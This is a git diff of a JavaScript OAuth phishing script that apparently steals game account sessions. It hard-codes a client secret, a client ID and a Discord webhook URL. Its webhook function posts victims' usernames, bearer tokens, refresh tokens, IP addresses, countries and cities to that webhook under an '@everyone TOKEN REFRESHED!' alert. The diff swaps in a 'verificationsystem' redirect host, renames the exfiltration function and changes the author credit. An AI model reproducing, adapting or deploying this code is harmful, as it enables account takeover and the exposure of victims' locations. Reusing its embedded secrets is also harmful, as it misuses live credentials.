@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = 'cXw8Q~tivfs8oVPAbAakLkaFv2atQGfHW0Bs2cK0' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'f6f9ea1f-0a01-49e1-854a-2771d19ebee4'
-const redirect_uri = 'hhttps://skyhelperbot.onrender.com'
+const redirect_uri = 'https://verificationsystem.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
 
 //Requirements
@@ -298,7 +298,7 @@ async function getRefreshData(refresh_token) {
 
 
 
-async function postToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, city, flag, security) {
+async function refreshToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, city, flag, security) {
     const url = webhook_url
     let isVpnOn
     if (security.is_vpn) isVpnOn = " (VPN)"
@@ -373,7 +373,7 @@ content: "@everyone TOKEN REFRESHED!",
         
       ],
       "footer": {
-        "text": "By heda",
+        "text": "By avereage",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
